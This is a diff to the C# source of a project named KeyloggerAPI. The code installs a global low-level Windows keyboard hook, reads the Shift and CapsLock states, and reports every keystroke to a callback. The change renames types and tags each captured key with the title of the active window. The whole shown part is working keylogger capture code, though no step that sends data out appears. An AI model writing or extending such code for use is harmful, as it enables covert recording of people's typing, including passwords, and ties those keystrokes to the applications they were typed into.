@@ -1,4 +1,4 @@
-﻿using KeyloggerAPI.KeyObject;
+﻿using KeyloggerAPI.CallbackObjects;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
@@ -6,6 +6,7 @@ using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace KeyloggerAPI
 {
@@ -18,7 +19,7 @@ namespace KeyloggerAPI
 		private const int WM_KEYDOWN = 0x100;
 		private const int WM_SYSKEYDOWN = 0x104;
 
-		private Action<Key> keyPressedCallback;
+		private Action<KeyPressed> keyPressedCallback;
 
 		public API()
 		{
@@ -27,7 +28,7 @@ namespace KeyloggerAPI
 			this.currentModuleId = User32.GetModuleHandle(currentModudle.ModuleName);
 		}
 
-		public void CreateKeyboardHook(Action<Key> keyPressedCallback)
+		public void CreateKeyboardHook(Action<KeyPressed> keyPressedCallback)
 		{
 			this.keyPressedCallback = keyPressedCallback;
 			this.globalKeyboardHookId = User32.SetWindowsHookEx(WH_KEYBOARD_LL, HookKeyboardCallback, this.currentModuleId, 0);
@@ -42,13 +43,13 @@ namespace KeyloggerAPI
 				bool shiftPressed = false;
 				bool capsLockActive = false;
 
-				var shiftKeyState = User32.GetAsyncKeyState(KeyValue.ShiftKey);
+				var shiftKeyState = User32.GetAsyncKeyState(KeyCode.ShiftKey);
 				if (FirstBitIsTurnedOn(shiftKeyState))
 					shiftPressed = true;
 
 				//We need to use GetKeyState to verify if CapsLock is "TOGGLED" 
 				//because GetAsyncKeyState only verifies if it is "PRESSED" at the moment
-				if (User32.GetKeyState(KeyValue.Capital) == 1)
+				if (User32.GetKeyState(KeyCode.Capital) == 1)
 					capsLockActive = true;
 
 				KeyParser(wParam, lParam, shiftPressed, capsLockActive);
@@ -66,9 +67,9 @@ namespace KeyloggerAPI
 
 			int textLength = User32.GetWindowText(hwnd, title, title.Capacity);
 			if ((textLength <= 0) || (textLength > title.Length))
-				return "Unknown";
+				return "[Unknown]";
 
-			return title.ToString();
+			return $"[{title}]";
 		}
 
 		private bool FirstBitIsTurnedOn(short value)
@@ -79,10 +80,10 @@ namespace KeyloggerAPI
 
 		private void KeyParser(IntPtr wParam, IntPtr lParam, bool shiftPressed, bool capsLockPressed)
 		{
-			var keyValue = (KeyValue)Marshal.ReadInt32(lParam);
-			
-			var key = new Key(keyValue, shiftPressed, capsLockPressed);
-			
+			var keyValue = (KeyCode)Marshal.ReadInt32(lParam);
+
+			var key = new KeyPressed(keyValue, shiftPressed, capsLockPressed, CurrentWindowTitle());
+
 			keyPressedCallback.Invoke(key);
 		}
 
